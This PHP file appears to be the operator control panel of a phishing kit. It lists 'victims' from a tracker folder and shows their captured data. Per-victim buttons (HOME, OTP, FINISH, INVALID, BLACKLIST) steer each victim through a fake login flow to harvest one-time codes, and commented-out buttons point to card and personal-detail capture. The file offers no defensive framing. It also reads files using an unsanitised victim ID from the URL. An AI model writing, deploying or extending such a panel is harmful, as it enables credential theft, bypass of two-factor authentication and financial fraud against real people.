<?php 
@session_start();
if(!isset($_SESSION['user'])) {
	header('Location: ./login');
    exit();
}

if(isset($_POST['Clean'])) {
    $folderPath = '../tracker/'; 
    $fileList = glob($folderPath . '/*');
    foreach ($fileList as $file) {
    if (is_file($file)) {
        unlink($file);
    }
    }
}

if(isset($_POST['autopilot'])) {
    $autopilot_val = $_POST['autopilot'];

    $file = fopen("../db.txt", 'r');

    // Check if file is opened successfully
    if ($file) {
        // Read the file line by line
        while (($line = fgets($file)) !== false) {
            // Check if the line contains AUTO_PILOT
            if (strpos($line, 'AUTO_PILOT') !== false) {
                // Extract the value after the '=' sign
                $value = explode('=', $line)[1];
                
                // Trim any leading/trailing whitespace
                $value = trim($value);
                
                // Output the value
                // echo "AUTO_PILOT value: $value";
                $pilotval = $value;
                
                // No need to continue looping, exit the loop
                break;
            }
        }

        while (($line = fgets($file)) !== false) {
            // Check if the line contains AUTO_PILOT
            if (strpos($line, 'DELAY') !== false) {
                // Extract the value after the '=' sign
                $value = explode('=', $line)[1];
                
                // Trim any leading/trailing whitespace
                $value = trim($value);
                
                // Output the value
                // echo "AUTO_PILOT value: $value";
                $DELAY = $value;
                
                // No need to continue looping, exit the loop
                break;
            }
        }
        
        // Close the file
        fclose($file);
    } else {
        // Error opening the file
        echo "Error opening file: $file_path";
    }

    $dbfile = fopen("../db.txt", "w") or die("Unable to open file!");
    $txt = "AUTO_PILOT = ".$autopilot_val."\n"."DELAY = ".$DELAY."\n";
    fwrite($dbfile, $txt);
    fclose($dbfile);

    $arr = array("st"=>"success", "msg"=>"201!");
    header('Content-type: application/json');
    echo json_encode($arr);
    exit();

    


    
}

if(isset($_GET['getClientData'])) {
    $vicid = $_GET['getClientData'];
    if(file_exists("../tracker/{$vicid}.txt")) {
        $vicdata = file_get_contents("../tracker/{$vicid}.txt");
    } else {
        $vicdata = "<h1 style='color:red'>No Data Found for {$vicid}</h2>";
    }

    $nvid = substr($vicid, 0, 25);

    $data = array(
        'vicid' => $nvid,
        'vicdata'  => $vicdata,
    );
    
    header('Content-type: application/json');
    echo json_encode($data);
    exit();
}

if(isset($_GET['count'])) {
    $folderPath = '../tracker'; // Replace with the actual folder path

    $files = scandir($folderPath);
    $fileCount = 0;

    foreach ($files as $file) {
        if (is_file($folderPath . '/' . $file) && pathinfo($file, PATHINFO_EXTENSION) === 'json') {
            $fileCount++;
        }
    }

    echo "Total Logs <br>";
    echo $fileCount;
}
if(isset($_GET['GetControl'])) {
    $directory = '../tracker'; // Replace with the actual directory path
    $jsonFiles = glob($directory . '/*.json');

    $fileTimes = array(); // Array to store file timestamps

    foreach ($jsonFiles as $file) {
        $fileTimes[$file] = filemtime($file); // Get file modification time
    }

    arsort($fileTimes); // Sort the file times in descending order

    foreach ($fileTimes as $file => $fileTime) {
        $fileName = basename($file, '.json');
        $vid = rand();
    
        echo ' <tr id="row' . $vid . '" data-index="0">
    <td class="align-middle">' . $fileName . '<i onclick="toggelVictim(\'' . $fileName . '\')" class="fa-solid fa-circle-info"></i></td>
    <td style="display : flex;flex-direction: column-reverse;" class="align-middle form-inline">
    <select class="xselect" id="SELECT' . $vid . '">
        <option selected="" disabled="" value="null">Select</option>
        <option value="EMAIL">Email</option>
        <option value="PHONE">Phone</option>
    </select>
    <input placeholder="value..." id="CODE' . $vid . '" type="text">
    </td>
        <td class="align-middle form-inline">
            <button onclick="submitCommand(\'HOME\', \'' . $vid . '\', \'' . $fileName . '\')" id="HOME' . $vid . '" data-id="' . $fileName . '" task="HOME" class="perform btn btn-primary btn-sm">HOME</button>
            <button onclick="submitCommand(\'OTP\', \'' . $vid . '\', \'' . $fileName . '\')" id="OTP' . $vid . '" data-id="' . $fileName . '" task="OTP" class="perform btn btn-primary btn-sm">OTP</button>
            <button onclick="submitCommand(\'FINISH\', \'' . $vid . '\', \'' . $fileName . '\')" id="FINISH' . $vid . '" data-id="' . $fileName . '" task="FINISH" class="perform btn btn-primary btn-sm">Finish</button>
            <button onclick="submitCommand(\'INVALID\', \'' . $vid . '\', \'' . $fileName . '\')" id="INVALID' . $vid . '" data-id="' . $fileName . '" task="INVALID" class="perform btn btn-warning btn-sm">Invalid</button>
            <button onclick="submitCommand(\'BLACKLIST\', \'' . $vid . '\', \'' . $fileName . '\')" id="BLACKLIST' . $vid . '" data-id="' . $fileName . '" task="BLACKLIST" class="perform btn btn-dark btn-sm">Blacklist</button>
            <button onclick="submitCommand(\'Del\', \'' . $vid . '\', \'' . $fileName . '\')" id="Del' . $vid . '" data-id="' . $fileName . '" class="delete btn btn-danger btn-sm">Delete</button>
        </td>
    </tr>';
    }

}

// <button onclick="submitCommand(\'Authenti\', \'' . $vid . '\', \'' . $fileName . '\')" id="Authenti' . $vid . '" data-id="' . $fileName . '" task="Authenti" class="perform btn btn-primary btn-sm">Authenti</button>
// <button onclick="submitCommand(\'DETAILS\', \'' . $vid . '\', \'' . $fileName . '\')" id="DETAILS' . $vid . '" data-id="' . $fileName . '" task="DETAILS" class="perform btn btn-primary btn-sm">Detail</button>
// <button onclick="submitCommand(\'CC\', \'' . $vid . '\', \'' . $fileName . '\')" id="CC' . $vid . '" data-id="' . $fileName . '" task="CC" class="perform btn btn-primary btn-sm">CARD</button>
?>

